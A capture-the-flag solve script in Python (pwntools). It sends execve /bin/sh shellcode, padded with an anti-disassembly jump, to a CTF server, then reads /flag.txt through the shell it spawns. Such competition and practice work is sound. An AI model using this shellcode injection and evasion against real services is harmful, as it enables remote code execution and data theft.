from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'  # Clean output

# Shellcode to spawn /bin/sh
shell = """
xor rax, rax
push rax
mov rdi, 0x68732f6e69622f2f
push rdi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
"""

# Bypass disassembler by inserting jump at byte 3
shellcode = asm(shell)[:3] + b'\xeb\x01\xe8' + asm(shell)[3:]

# Connect to remote server
p = remote("play.h7tex.com", 47729)

# Wait for prompt
p.recvuntil(b'without 0x prefix):\n')

# Send shellcode
p.sendline(shellcode.hex().encode())
time.sleep(1)

# Clear any buffered output
try:
    p.recv(timeout=1)
except:
    pass

# Read flag
p.sendline(b'cat /flag.txt')
time.sleep(0.5)

# Get output and extract flag
output = p.recvall(timeout=3)

if b'H7CTF{' in output:
    flag_start = output.find(b'H7CTF{')
    flag_end = output.find(b'}', flag_start) + 1
    flag = output[flag_start:flag_end]
    log.success(f"Flag: {flag.decode().strip()}")
else:
    log.error("Flag not found in output!")

p.close()
